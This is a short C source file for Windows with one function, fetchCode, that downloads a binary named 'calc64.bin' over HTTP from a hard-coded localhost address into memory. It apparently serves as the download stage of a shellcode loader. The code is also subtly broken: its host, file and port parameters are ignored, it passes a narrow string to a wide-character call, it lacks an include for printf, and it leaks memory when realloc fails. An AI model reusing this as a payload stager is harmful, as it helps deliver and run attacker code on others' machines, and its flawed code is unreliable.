#include <windows.h>
#include <wininet.h>
#include <stdlib.h>

int fetchCode(const wchar_t* hostname, const wchar_t* file, int port, unsigned char** buffer, DWORD* size) {
    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    DWORD bufferSize = 4096; // initial buffer size

    // Allocate buffer
    *buffer = (unsigned char*)malloc(bufferSize);
    if (*buffer == NULL) {
        return -2; // Failed to allocate memory
    }

    HINTERNET hInternet = InternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        free(*buffer);
        return -1;
    }

    HINTERNET hConnect = InternetOpenUrl(hInternet, "http://localhost:8000/calc64.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        DWORD error = GetLastError();
        printf("InternetOpenUrl failed, error code = %lu\n", error);
        InternetCloseHandle(hInternet);
        free(*buffer);
        return -3;
    }


    while (InternetReadFile(hConnect, *buffer + totalBytesRead, bufferSize - totalBytesRead, &bytesRead) && bytesRead > 0) {
        totalBytesRead += bytesRead;
        if (totalBytesRead == bufferSize) {
            // Resize buffer
            bufferSize *= 2;
            *buffer = realloc(*buffer, bufferSize);
            if (*buffer == NULL) {
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                return -2; // Failed to allocate more memory
            }
        }
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    *size = totalBytesRead;
    return 0; // Success
}
